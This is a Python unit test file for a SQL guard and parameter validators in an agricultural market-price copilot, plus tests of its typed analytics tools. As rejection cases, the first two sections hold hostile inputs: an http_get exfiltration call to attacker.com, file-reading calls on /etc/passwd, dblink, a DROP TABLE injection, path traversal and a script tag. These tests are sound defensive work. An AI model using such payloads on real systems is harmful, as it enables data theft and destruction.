"""Unit tests for Copilot typed analytical tools, hardened SQL guard, and zero-leakage security (R6.1, ADR-095).

Normative tests:
1. SQL injection, data-modifying CTEs, dangerous system/network functions, out-of-schema queries, and SELECT INTO rejected.
2. Strict enforcement of LIMIT <= 500 (injection and clamping).
3. Secure error explanations without leaking database credentials or internal infrastructure.
4. Typed analytical tool catalog validation (price series, market facts, source provenance, market coverage, forecasts, crop calendar).
5. Strict validation and rejection of invalid/injection-laden product or location parameters.
"""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from ketrika.copilot.executor import QueryResult
from ketrika.copilot.sql_guard import (
    SqlGuardError,
    validate_and_sanitize_sql,
)
from ketrika.copilot.tools import (
    AnalyticalToolCatalog,
    ParameterValidationError,
    validate_location_pcode,
    validate_month_string,
    validate_product_code,
)

# ==============================================================================
# 1. HARDENED SQL GUARD TESTS (R6.1 Security Criteria)
# ==============================================================================


def test_sql_guard_blocks_data_modifying_ctes() -> None:
    """Verify data-modifying CTEs (WITH ... DELETE/UPDATE/INSERT) are strictly rejected."""
    # CTE with DELETE
    delete_cte = """
    WITH malicious_delete AS (
        DELETE FROM gold.price_monthly_best RETURNING *
    )
    SELECT * FROM malicious_delete;
    """
    with pytest.raises(SqlGuardError) as exc_info:
        validate_and_sanitize_sql(delete_cte)
    assert exc_info.value.violation_code in ("MODIFICATION_NOT_ALLOWED", "CTE_NOT_SELECT")

    # CTE with UPDATE
    update_cte = """
    WITH malicious_update AS (
        UPDATE gold.price_monthly_best SET median_price = 0 RETURNING *
    )
    SELECT * FROM malicious_update;
    """
    with pytest.raises(SqlGuardError) as exc_info:
        validate_and_sanitize_sql(update_cte)
    assert exc_info.value.violation_code in ("MODIFICATION_NOT_ALLOWED", "CTE_NOT_SELECT")

    # CTE with INSERT
    insert_cte = """
    WITH malicious_insert AS (
        INSERT INTO gold.price_monthly_best (median_price) VALUES (9999) RETURNING *
    )
    SELECT * FROM malicious_insert;
    """
    with pytest.raises(SqlGuardError) as exc_info:
        validate_and_sanitize_sql(insert_cte)
    assert exc_info.value.violation_code in ("MODIFICATION_NOT_ALLOWED", "CTE_NOT_SELECT")


def test_sql_guard_blocks_network_and_exfiltration_functions() -> None:
    """Verify dangerous network, file and exfiltration functions are blocked."""
    prohibited_queries = [
        ("SELECT http_get('http://attacker.com/leak') FROM gold.price_monthly_best;", "http_get"),
        ("SELECT dblink('dbname=target', 'SELECT 1') FROM gold.price_monthly_best;", "dblink"),
        ("SELECT dblink_connect('conn_str') FROM gold.price_monthly_best;", "dblink"),
        (
            "SELECT query_to_xml('SELECT * FROM gold.price_monthly_best', true, false, '') FROM gold.price_monthly_best;",
            "query_to_xml",
        ),
        ("SELECT pg_ls_dir('/etc') FROM gold.price_monthly_best;", "pg_ls_dir"),
        ("SELECT pg_stat_file('/etc/passwd') FROM gold.price_monthly_best;", "pg_stat_file"),
        ("SELECT crosstab('SELECT 1, 2, 3') FROM gold.price_monthly_best;", "crosstab"),
    ]

    for sql, _func_name in prohibited_queries:
        with pytest.raises(SqlGuardError) as exc_info:
            validate_and_sanitize_sql(sql)
        assert exc_info.value.violation_code in ("FORBIDDEN_FUNCTION", "ACCESS_DENIED")
        assert (
            "interdite" in str(exc_info.value).lower() or "interdit" in str(exc_info.value).lower()
        )


def test_sql_guard_blocks_select_into() -> None:
    """Verify SELECT ... INTO is strictly rejected."""
    sql = "SELECT * INTO gold.new_dump FROM gold.price_monthly_best;"
    with pytest.raises(SqlGuardError) as exc_info:
        validate_and_sanitize_sql(sql)
    assert exc_info.value.violation_code in ("INTO_NOT_ALLOWED", "MODIFICATION_NOT_ALLOWED")


def test_sql_guard_blocks_forbidden_schemas_and_meta_tables() -> None:
    """Verify non-Gold schemas are strictly refused without disclosing database internals."""
    schemas_to_test = [
        "SELECT * FROM information_schema.tables;",
        "SELECT * FROM pg_catalog.pg_tables;",
        "SELECT * FROM auth.user_account;",
        "SELECT * FROM obs.price_observation;",
        "SELECT * FROM bronze.source_record;",
        "SELECT * FROM silver.market_price;",
    ]

    for sql in schemas_to_test:
        with pytest.raises(SqlGuardError) as exc_info:
            validate_and_sanitize_sql(sql)
        assert exc_info.value.violation_code in ("FORBIDDEN_SCHEMA", "ACCESS_DENIED")
        # Ensure no credential or IP leakage in error message
        assert "password" not in str(exc_info.value).lower()
        assert "postgres://" not in str(exc_info.value).lower()


def test_sql_guard_allows_valid_pure_select_with_ctes() -> None:
    """Verify legitimate read-only CTEs on Gold are accepted."""
    sql = """
    WITH recent_prices AS (
        SELECT product_code, month, median_price
        FROM gold.price_monthly_best
        WHERE month >= '2024-01-01'
    )
    SELECT product_code, avg(median_price) as avg_price
    FROM recent_prices
    GROUP BY product_code
    ORDER BY avg_price DESC;
    """
    sanitized = validate_and_sanitize_sql(sql)
    assert "gold" in sanitized.lower()
    assert "LIMIT 500" in sanitized


def test_sql_guard_clamps_limit_to_500() -> None:
    """Verify LIMIT greater than 500 is clamped to 500."""
    sql = "SELECT * FROM gold.price_monthly_best LIMIT 2000;"
    sanitized = validate_and_sanitize_sql(sql)
    assert "LIMIT 500" in sanitized
    assert "2000" not in sanitized


# ==============================================================================
# 2. PARAMETER VALIDATION & SAFE EXPLANATION TESTS
# ==============================================================================


def test_parameter_validation_product_code() -> None:
    """Verify strict validation and rejection of dangerous product code inputs."""
    assert validate_product_code("RICE_WHITE") == "RICE_WHITE"
    assert validate_product_code("rice_milled") == "rice_milled"
    assert validate_product_code("MAIZE_GRAIN") == "MAIZE_GRAIN"

    # Malicious or invalid patterns
    bad_codes = [
        "rice'; DROP TABLE gold.price_monthly_best;--",
        "rice OR 1=1",
        "a",  # too short (< 2)
        "rice$#@",
        "rice milled",  # space not allowed
    ]
    for bad in bad_codes:
        with pytest.raises(ParameterValidationError) as exc_info:
            validate_product_code(bad)
        assert "non valide" in str(exc_info.value)
        # Ensure message does not leak system paths or secrets
        assert "/" not in str(exc_info.value)
        assert "SELECT" not in str(exc_info.value)


def test_parameter_validation_location_pcode() -> None:
    """Verify strict validation of geographical P-Codes."""
    assert validate_location_pcode("MG-T") == "MG-T"
    assert validate_location_pcode("MKT_ANOSIBE") == "MKT_ANOSIBE"
    assert validate_location_pcode("ZONE_ALAOTRA") == "ZONE_ALAOTRA"

    bad_pcodes = [
        "MG-T' OR '1'='1",
        "../../etc/passwd",
        "<script>alert(1)</script>",
        "MG T",
    ]
    for bad in bad_pcodes:
        with pytest.raises(ParameterValidationError) as exc_info:
            validate_location_pcode(bad)
        assert "non valide" in str(exc_info.value)


def test_parameter_validation_month_format() -> None:
    """Verify strict format validation for YYYY-MM."""
    assert validate_month_string("2024-05") == "2024-05"

    bad_months = [
        "2024-5",
        "2024/05",
        "May 2024",
        "2024-05; DELETE FROM gold",
    ]
    for bad in bad_months:
        with pytest.raises(ParameterValidationError):
            validate_month_string(bad)


# ==============================================================================
# 3. TYPED ANALYTICAL TOOL CATALOG TESTS
# ==============================================================================


@patch("ketrika.copilot.tools.execute_copilot_query")
def test_tool_catalog_get_price_series(mock_exec: MagicMock) -> None:
    """Verify get_price_series tool queries gold.price_monthly_best and returns PriceSeriesOutput."""
    mock_exec.return_value = QueryResult(
        sql="SELECT ...",
        columns=["month", "product_name", "location_name", "median_price", "chosen_source_id"],
        rows=[
            {
                "month": "2024-05",
                "product_name": "Riz blanc",
                "location_name": "Analamanga",
                "median_price": 2800.0,
                "chosen_source_id": "odr",
            }
        ],
        row_count=1,
        citations=[{"source_id": "odr", "kind": "official_source"}],
        value_kinds=["observed"],
    )

    catalog = AnalyticalToolCatalog()
    out = catalog.get_price_series(
        product_code="rice_milled",
        location_pcode="MG-T",
        period_start="2024-01",
        period_end="2024-05",
    )

    assert out.product_code == "rice_milled"
    assert out.row_count == 1
    assert out.series[0].median_price_mga == 2800.0
    assert out.series[0].chosen_source_id == "odr"
    assert out.citations == [{"source_id": "odr", "kind": "official_source"}]


@patch("ketrika.copilot.tools.execute_copilot_query")
def test_tool_catalog_get_market_facts(mock_exec: MagicMock) -> None:
    """Verify get_market_facts queries price changes and volatility."""
    mock_exec.return_value = QueryResult(
        sql="SELECT ...",
        columns=[
            "month",
            "product_name",
            "location_name",
            "median_price",
            "chg_1m",
            "chg_12m",
            "z_score_robust",
            "vol_12",
        ],
        rows=[
            {
                "month": "2024-05",
                "product_name": "Riz blanc",
                "location_name": "Analamanga",
                "median_price": 2800.0,
                "chg_1m": 0.05,
                "chg_12m": 0.12,
                "z_score_robust": 1.4,
                "vol_12": 0.08,
            }
        ],
        row_count=1,
    )

    catalog = AnalyticalToolCatalog()
    out = catalog.get_market_facts(product_code="rice_milled", month="2024-05")

    assert out.product_code == "rice_milled"
    assert len(out.metrics) == 1
    assert out.metrics[0].chg_1m_pct == 0.05
    assert out.metrics[0].z_score_robust == 1.4


@patch("ketrika.copilot.tools.execute_copilot_query")
def test_tool_catalog_get_source_provenance(mock_exec: MagicMock) -> None:
    """Verify get_source_provenance queries gold.source_health."""
    mock_exec.return_value = QueryResult(
        sql="SELECT ...",
        columns=["source_id", "priority", "freshness_days", "freshness_sla_days", "is_stale"],
        rows=[
            {
                "source_id": "odr",
                "priority": 1,
                "freshness_days": 4,
                "freshness_sla_days": 7,
                "is_stale": False,
            }
        ],
        row_count=1,
    )

    catalog = AnalyticalToolCatalog()
    out = catalog.get_source_provenance("odr")

    assert out.source_id == "odr"
    assert out.priority == 1
    assert out.freshness_days == 4
    assert out.is_stale is False
    assert out.verification_status == "OFFICIAL_PROVENANCE_VERIFIED"


@patch("ketrika.copilot.tools.execute_copilot_query")
def test_tool_catalog_get_market_coverage(mock_exec: MagicMock) -> None:
    """Verify get_market_coverage queries market coverage statistics."""
    mock_exec.return_value = QueryResult(
        sql="SELECT ...",
        columns=["n_locations", "n_rows"],
        rows=[{"n_locations": 15, "n_rows": 120}],
        row_count=1,
    )

    catalog = AnalyticalToolCatalog()
    out = catalog.get_market_coverage(
        product_code="rice_milled",
        start_date="2024-01",
        end_date="2024-05",
    )

    assert out.product_code == "rice_milled"
    assert out.active_markets_count == 15
    assert out.total_surveys_recorded == 120
    assert out.coverage_ratio == round(15 / 22.0, 3)


@patch("ketrika.copilot.tools.execute_copilot_query")
def test_tool_catalog_get_qualified_forecast(mock_exec: MagicMock) -> None:
    """Verify get_qualified_forecast returns p10/p50/p90 projections."""
    mock_exec.return_value = QueryResult(
        sql="SELECT ...",
        columns=["horizon", "target_period", "p10", "p50", "p90", "model_name"],
        rows=[
            {
                "horizon": 1,
                "target_period": "2024-06",
                "p10": 2750.0,
                "p50": 2850.0,
                "p90": 2980.0,
                "model_name": "SeasonalNaive",
            }
        ],
        row_count=1,
    )

    catalog = AnalyticalToolCatalog()
    out = catalog.get_qualified_forecast(product_code="rice_milled", horizon=1)

    assert out.product_code == "rice_milled"
    assert len(out.horizons) == 1
    assert out.horizons[0].p50 == 2850.0
    assert out.horizons[0].model_name == "SeasonalNaive"


def test_tool_catalog_get_crop_calendar() -> None:
    """Verify get_crop_calendar extracts phenological bounds from authentic calendar."""
    catalog = AnalyticalToolCatalog()
    out = catalog.get_crop_calendar(zone_code="ZONE_ALAOTRA", crop="RICE")

    assert out.zone_code == "ZONE_ALAOTRA"
    assert out.crop == "RICE"
    assert "Mois" in out.planting_dekads
    assert "Mois" in out.harvest_nominal_dekads
    assert "irrigated" in out.regime or "lowland" in out.regime or out.regime != ""
